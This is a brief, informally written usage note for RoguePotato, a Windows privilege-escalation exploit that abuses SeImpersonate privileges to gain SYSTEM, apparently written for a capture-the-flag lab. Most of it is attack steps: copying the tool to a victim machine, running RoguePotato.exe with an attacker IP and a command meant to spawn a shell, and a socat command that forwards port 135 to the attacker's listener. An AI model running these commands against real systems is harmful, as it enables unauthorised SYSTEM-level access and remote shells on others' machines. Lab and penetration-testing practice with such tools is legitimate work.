Rogue_Potato

this is a improved to juicy potato 
JuicyPotato abused SeImpersonate or SeAssignPrimaryToken privileges to get execution as SYSTEM. It is actually an improved and more flexible adaptation of RottenPotatoNG and lonelypotato. so Rogue potato is the solution 

1- download zipfile and unzip it after that transfer both files to the victim machine 
2- run .\RoguePotato.exe -r your_ip -e "cmd.exe /c ping 10.10.14.9" "your command and for sure the shell " -l 9999(any port)
   thats will send a tcp packet to yourip to 135 port so you want to take it back to port 9999 for the success of exploit 
   so befor run RoguePotato run socat port forwarding 
     socat tcp-listen:135,reuseaddr,fork tcp:10.10.10.180:9999
